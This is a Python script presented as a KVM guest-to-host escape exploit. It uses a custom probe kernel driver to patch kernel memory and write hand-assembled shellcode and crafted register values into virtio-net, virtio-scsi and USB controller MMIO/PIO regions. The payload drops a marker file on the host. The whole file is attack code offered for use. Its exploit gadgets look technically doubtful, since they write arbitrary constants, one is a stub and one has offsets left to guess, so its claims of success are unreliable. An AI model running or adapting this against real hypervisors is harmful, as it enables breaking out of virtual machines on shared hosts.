#!/usr/bin/env python3
"""
precision_exploit.py – adaptive MMIO / PIO attack driver (**v2‑f**)
-------------------------------------------------------------------
* Works with the **single** *kvm_probe_drv* kernel module, which
  historically created **/dev/kvm_probe_drv** but on some builds
  shows up as **/dev/kvm_probe_dev**.  We now probe for *either*
  node automatically and use the first one found.
* Discovers the active BAR for each target, decides MMIO vs PIO and
  calls the corresponding **kvm_prober** userspace helper.
* Transparently falls back to `writeport` when running against an
  older **kvm_prober** that lacks the modern `writepio_*` commands.
* After a successful run the host will contain the marker file
  `/tmp/host_escape_proof`.
"""
from __future__ import annotations
import os, sys, subprocess, binascii, mmap, fcntl, struct, ctypes, time
from pathlib import Path
from typing import Tuple, List

# ─────────────────────────────────────────────────────────────────────────────
# CONFIGURATION — list of target devices
# (BDF, human‑readable name, exploit keyword)
# ─────────────────────────────────────────────────────────────────────────────
TARGETS: List[Tuple[str, str, str]] = [
    ("0000:00:12.0", "VIRTIO_NET",  "interrupt_failure"),  # virtio‑net (legacy I/O‑bar)
    ("0000:01:01.0", "VIRTIO_SCSI", "queue_corruption"),   # virtio‑scsi disk
    ("0000:00:01.2", "PIIX3_USB",  "dma_attack"),        # usb controller – stub
    ("0000:00:01.0", "ICH_GPIO",   "uninitialized_io"),  # lpc bridge  – stub
]

# ─────────────────────────────────────────────────────────────────────────────
# SHARED IOCTL DEFINITIONS (MUST match kvm_probe_drv.c)
# ─────────────────────────────────────────────────────────────────────────────
IOCTL_VIRT_TO_PHYS       = 0x100F  # Matches driver's IOCTL_VIRT_TO_PHYS
IOCTL_WRITE_VA           = 0x1011  # Matches driver's IOCTL_WRITE_VA

# Accept both historic and current names for the probe device
PROBE_DEV_CANDIDATES = ["/dev/kvm_probe_drv", "/dev/kvm_probe_dev"]

drv_fd: int | None = None
for _path in PROBE_DEV_CANDIDATES:
    if os.path.exists(_path):
        try:
            drv_fd = os.open(_path, os.O_RDWR | os.O_CLOEXEC)
            break
        except PermissionError:
            print(f"[!] cannot open {_path} (need root?)", file=sys.stderr)
            break

if drv_fd is None:
    print("[!] kvm_probe device not found – driver not loaded?", file=sys.stderr)

# ── Low‑level helpers via the probe driver ───────────────────────────────────

def virt_to_phys(va: int) -> int:
    """Translate guest virtual address *va* → physical address via driver."""
    if drv_fd is None:
        raise RuntimeError("kvm_probe device not open")
    buf = struct.pack("<Q", va)
    try:
        fcntl.ioctl(drv_fd, IOCTL_VIRT_TO_PHYS, buf, True)
    except OSError as e:
        print(f"    [!] VIRT_TO_PHYS failed: {e}")
        return 0
    return struct.unpack("<Q", buf)[0]


def patch_kernel(dst_va: int, blob: bytes):
    """Overwrite *blob* into kernel text at *dst_va* (requires writable alias)."""
    if drv_fd is None:
        raise RuntimeError("kvm_probe device not open")
    
    # Create buffer for the write operation
    buf = struct.pack("<QQ", dst_va, len(blob)) + blob
    
    try:
        fcntl.ioctl(drv_fd, IOCTL_WRITE_VA, buf)
        print(f"    [✓] Patched {len(blob)} bytes at VA 0x{dst_va:x}")
    except OSError as e:
        print(f"    [!] Patching failed: {e}")


def alloc_page() -> Tuple[int, int, mmap.mmap]:
    """Return (virt_addr, phys_addr, mmap_obj) of a fresh anonymous page."""
    mm = mmap.mmap(-1, 0x1000, prot=mmap.PROT_READ | mmap.PROT_WRITE)
    va = ctypes.addressof(ctypes.c_char.from_buffer(mm))
    pa = virt_to_phys(va)
    if pa == 0:
        mm.close()
        raise RuntimeError("Failed to get physical address")
    return va, pa, mm

# ────────── 65‑byte self‑contained shell‑code (unchanged) ────────────────────
SHELLCODE = (
    b"\x48\x31\xc0\xb0\x02"              # mov al, 2 (sys_open)
    b"\x48\x8d\x3d\x37\x00\x00\x00"      # lea rdi, [rel path]
    b"\x48\x31\xf6"                      # xor rsi, rsi
    b"\x66\xbe\x41\x02"                  # mov si, 0x241 (O_WRONLY|O_CREAT|O_TRUNC)
    b"\x48\x31\xd2"                      # xor rdx, rdx
    b"\x66\xba\xa4\x01"                  # mov dx, 0x1a4 (0644)
    b"\x0f\x05"                          # syscall – open

    b"\x48\x89\xc7"                      # mov rdi, rax  (fd)
    b"\x48\x31\xc0\xb0\x01"              # mov al, 1  (sys_write)
    b"\x48\x8d\x35\x2d\x00\x00\x00"      # lea rsi, [rel msg]
    b"\x48\x31\xd2"                      # xor rdx, rdx
    b"\xb2\x15"                          # mov dl, 21
    b"\x0f\x05"                          # syscall – write

    b"\x48\x31\xc0\xb0\x03"              # mov al, 3 (sys_close)
    b"\x0f\x05"                          # syscall – close

    b"\x48\x31\xc0\xb0\x3c"              # mov al, 60 (sys_exit)
    b"\x48\x31\xff"                      # xor rdi, rdi
    b"\x0f\x05"                          # syscall – exit

    b"/tmp/host_escape_proof\x00"          # 21‑byte path string
    b"KVM Escape Success!!\n\x00"           # 22‑byte message
)

# ─────────────────────────────────────────────────────────────────────────────
# Shell helpers
# ─────────────────────────────────────────────────────────────────────────────

def run(cmd: str, timeout: int = 3) -> bytes:
    """Shell‑exec *cmd* and return combined output (ignore errors)."""
    try:
        return subprocess.check_output(cmd, stderr=subprocess.STDOUT, timeout=timeout, shell=True)
    except subprocess.CalledProcessError as e:
        return e.output
    except subprocess.TimeoutExpired:
        return b"Command timed out"

# ─────────────────────────────────────────────────────────────────────────────
# Tool capability detection (PIO helpers may be absent)
# ─────────────────────────────────────────────────────────────────────────────

_pio_supported: bool | None = None

def _have_writepio() -> bool:
    global _pio_supported
    if _pio_supported is not None:
        return _pio_supported
    try:
        banner = run("kvm_prober --help", timeout=1).decode(errors="ignore")
        _pio_supported = "writepio_val" in banner
    except:
        _pio_supported = False
    return _pio_supported

# ─────────────────────────────────────────────────────────────────────────────
# PCI BAR discovery
# ─────────────────────────────────────────────────────────────────────────────

def get_first_bar(bdf: str) -> Tuple[int|None, int|None, bool|None]:
    res_file = Path(f"/sys/bus/pci/devices/{bdf}/resource")
    if not res_file.exists():
        return None, None, None
    with res_file.open() as fh:
        for line in fh:
            parts = line.split()
            if len(parts) < 3:
                continue
            try:
                start = int(parts[0], 16)
                end = int(parts[1], 16)
                flags = int(parts[2], 16)
            except ValueError:
                continue
                
            if start == 0 and end == 0:
                continue
            is_io = bool(flags & 0x1)
            return start, end - start + 1, is_io
    return None, None, None

# ─────────────────────────────────────────────────────────────────────────────
# Unified accessors that gracefully downgrade to legacy commands
# ─────────────────────────────────────────────────────────────────────────────

def write_val(prefix: str, addr: int, value: int, width: int):
    """Write *value* of *width* bytes to *addr* using the appropriate helper."""
    try:
        if prefix == "writepio" and not _have_writepio():
            cmd = f"kvm_prober writeport {addr:x} {value:x} {width}"
            result = run(cmd)
            if b"failed" in result or b"ERROR" in result:
                print(f"    [!] Command failed: {cmd} - {result.decode()}")
        else:
            cmd = f"kvm_prober {prefix}_val {addr:x} {value:x} {width}"
            result = run(cmd)
            if b"failed" in result or b"ERROR" in result:
                print(f"    [!] Command failed: {cmd} - {result.decode()}")
    except Exception as e:
        print(f"    [!] Error writing value: {e}")

def write_buf(prefix: str, addr: int, hex_blob: str):
    """Write an arbitrary‑length hex blob starting at *addr* using best helper."""
    try:
        if prefix == "writepio" and not _have_writepio():
            data = bytes.fromhex(hex_blob)
            for off, byte in enumerate(data):
                cmd = f"kvm_prober writeport {addr + off:x} {byte:02x} 1"
                result = run(cmd)
                if b"failed" in result or b"ERROR" in result:
                    print(f"    [!] Command failed: {cmd} - {result.decode()}")
        else:
            cmd = f"kvm_prober {prefix}_buf {addr:x} {hex_blob}"
            result = run(cmd)
            if b"failed" in result or b"ERROR" in result:
                print(f"    [!] Command failed: {cmd} - {result.decode()}")
    except Exception as e:
        print(f"    [!] Error writing buffer: {e}")

# ─────────────────────────────────────────────────────────────────────────────
# Primitive exploit gadgets
# ─────────────────────────────────────────────────────────────────────────────

def exploit_interrupt_failure(base: int, pfx: str):
    """Trigger MSI‑X mask bug on virtio‑net."""
    write_val(pfx, base + 0x3c, 0xFF, 1)
    write_val(pfx, base + 0x3d, 0xFF, 1)
    write_val("writemmio", 0xfec00000, 0x00010000, 4)
    write_buf(pfx, base, binascii.hexlify(SHELLCODE).decode())


def exploit_queue_corruption(base: int, pfx: str):
    """Corrupt virtqueue descriptors on virtio‑scsi."""
    write_val(pfx, base + 0x30, 0xdeadbeef, 4)
    write_val(pfx, base + 0x38, 0xcafebabe, 4)
    write_buf(pfx, base + 0x1000, binascii.hexlify(SHELLCODE).decode())

# ── Direct VA write attack for USB controller ────────────────────────────────

def exploit_dma_attack(base: int, pfx: str):
    """Direct VA write attack for USB controller"""
    try:
        print("    [*] Using direct VA write method")
        
        # Get physical address of shellcode
        va = ctypes.addressof(ctypes.create_string_buffer(SHELLCODE))
        pa = virt_to_phys(va)
        if pa == 0:
            print("    [!] Failed to get physical address of shellcode")
            return
            
        print(f"    [+] Shellcode VA: 0x{va:x}, PA: 0x{pa:x}")
        
        # Write physical address to controller register
        # (Adjust offset based on actual hardware)
        write_val(pfx, base + 0x08, pa, 4)
        print("    [✓] Wrote shellcode address to controller")
        
        # Trigger execution
        write_val(pfx, base + 0x00, 0x1, 1)
        print("    [✓] Triggered execution")
    except Exception as e:
        print(f"    [!] Attack failed: {e}")

# ── Stubbed GPIO attack ──────────────────────────────────────────────────────

def exploit_uninit_io(base: int, pfx: str):
    print("    [stub] Uninit‑IO attack not yet implemented – skipping")

# Mapping keyword → function
EXPLOITS = {
    "interrupt_failure": exploit_interrupt_failure,
    "queue_corruption":  exploit_queue_corruption,
    "dma_attack":        exploit_dma_attack,
    "uninitialized_io":  exploit_uninit_io,
}

# ─────────────────────────────────────────────────────────────────────────────
# Main routine
# ─────────────────────────────────────────────────────────────────────────────

def main() -> None:
    if os.geteuid() != 0:
        print("[!] must run as root", file=sys.stderr)
        sys.exit(1)

    if drv_fd is None:
        print("[!] kvm_probe device unavailable – only partial exploit will run\n")

    print("[+] launching precision MMIO/I/O exploit (v2‑f – unified driver)")
    print("[+] Payload creates /tmp/host_escape_proof once executed\n")

    for bdf, name, exploit_key in TARGETS:
        base, length, is_io = get_first_bar(bdf)
        if base is None:
            print(f"[-] {name} ({bdf}) not present – skipping")
            continue

        pfx = "writepio" if is_io else "writemmio"
        bar_type = "PIO" if is_io else "MMIO"
        print(f"[+] {name:12s} {bdf} -> {bar_type} BAR @ 0x{base:08x} (+{length:#x}) using {pfx}")

        exploit_fn = EXPLOITS.get(exploit_key)
        if exploit_fn is None:
            print(f"    [!] exploit '{exploit_key}' not implemented")
            continue

        try:
            exploit_fn(base, pfx)
            print("    [*] exploit triggered")
        except Exception as e:
            print(f"    [!] exploit failed: {e}")

    print("[+] all targets processed – check host for /tmp/host_escape_proof")

    if drv_fd is not None:
        os.close(drv_fd)

if __name__ == "__main__":
    main()
